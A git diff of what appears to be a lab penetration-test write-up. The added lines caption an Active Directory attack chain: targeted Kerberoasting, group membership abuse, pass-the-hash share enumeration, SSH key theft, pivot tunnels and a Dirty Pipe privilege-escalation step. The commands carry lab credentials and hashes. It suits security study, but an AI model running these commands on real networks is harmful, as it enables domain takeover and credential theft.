@@ -2564,6 +2564,8 @@ Enumerating mssqladm acl:
 
 By following this acl chain, a domain compromise will be possible since server admins can perform a dcsync.
 
+Performing a targetedKerberoast against ttimmons, leveraging GenericWrite
+
 ```
 python3 targetedKerberoast.py -v -d 'INLANEFREIGHT.LOCAL' -u 'mssqladm' -p 'DBAilfreight1!' --dc-ip 172.16.8.3 --request-user ttimmons
 [*] Starting kerberoast attacks
@@ -2641,6 +2643,8 @@ Stopped: Sat Nov 14 16:07:39 2026
 
 ttimmons:Repeat09
 
+ttimmons can add itself to the Server Admins group:
+
 ```bash
 net rpc group addmem "Server Admins" "ttimmons" -U "INLANEFREIGHT.LOCAL"/"ttimmons"%"Repeat09" -S DC01
 ```
@@ -2717,6 +2721,8 @@ Mode                LastWriteTime         Length Name
 
 ```
 
+## post exploitation enumeration:
+
 ```
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> ipconfig
 
@@ -2758,6 +2764,8 @@ time="2026-11-15T08:34:22-08:00" level=info msg="Connection established" addr="1
 
 ```
 
+setting up the second tunnel:
+
 ```
 [Agent : srvadm@dmz01] » INFO[0657] Agent joined.                                 id=0050568a9bb0 name="INLANEFREIGHT\\Administrator@DC01" remote="127.0.0.1:45122"
 [Agent : srvadm@dmz01] » session
@@ -2774,6 +2782,8 @@ INFO[0707] Creating routes for gameleatherhead...
 INFO[0711] Starting tunnel to INLANEFREIGHT\Administrator@DC01 (0050568a9bb0) 
 
 ```
+
+Enumerating the hosts in the newly disclosed subnet reveals another host, aside from the DC.
 
 ```
  fping -asgq 172.16.9.0/24
@@ -2796,6 +2806,8 @@ INFO[0711] Starting tunnel to INLANEFREIGHT\Administrator@DC01 (0050568a9bb0)
        10.494 sec (elapsed real time)
 
 ```
+
+Only ssh is available:
 
 ```
  nmap -sC -sV 172.16.9.25 
@@ -2853,11 +2865,15 @@ Nmap done: 1 IP address (1 host up) scanned in 109.49 seconds
                                                                                     
 ```
 
+I dumped ntds.dit but it did not revealed to be very useful in this case.
+
 SMB again
 
 ```bash
 smbmap -u Administrator -p 'aad3b435b51404eeaad3b435b51404ee:fd1f7e5564060258ea787ddbb6e6afa2' -H 172.16.8.3 -r "Department Shares" --depth 5
 ```
+
+Discloses rsa private keys for the users:
 
 ```
 [+] IP: 172.16.8.3:445  Name: DC01.INLANEFREIGHT.LOCAL  Status: ADMIN!!!   
@@ -2932,6 +2948,8 @@ smbmap -u Administrator -p 'aad3b435b51404eeaad3b435b51404ee:fd1f7e5564060258ea7
 [-] Closing connections..                                                                           
 ```
 
+Dowloading:
+
 ```bash
 smbmap -u Administrator -p 'aad3b435b51404eeaad3b435b51404ee:fd1f7e5564060258ea787ddbb6e6afa2' -H 172.16.8.3 --download "Department Shares//IT/Private/Networking/harry-id_rsa"
 ```
@@ -2998,12 +3016,16 @@ ssmallsadm@MGMT01:~$ ls -la
 
 ```
 
+Kernel emumeration reveals that the host is vulnerable to dirtypipe:
+
 ```
 ssmallsadm@MGMT01:~$ uname -a
 Linux MGMT01 5.10.0-051000-generic #202012132330 SMP Sun Dec 13 23:33:36 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 ssmallsadm@MGMT01:~$ 
 
 ```
+
+Dowloading the poc on kali:
 
 
 ```bash
